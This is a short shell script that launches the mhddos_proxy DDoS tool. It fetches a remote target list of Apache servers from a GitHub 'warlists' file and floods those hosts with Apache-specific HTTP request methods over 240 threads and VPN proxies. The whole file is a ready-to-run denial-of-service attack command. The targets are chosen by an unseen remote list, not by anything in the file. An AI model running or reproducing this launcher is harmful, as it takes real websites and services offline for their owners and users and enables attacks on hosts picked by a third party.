#!/usr/bin/env sh

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

python3 runner.py \
  --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_apache.lst \
  --debug \
  --http-methods APACHE GSB \
  --threads 240 \
  --vpn 50
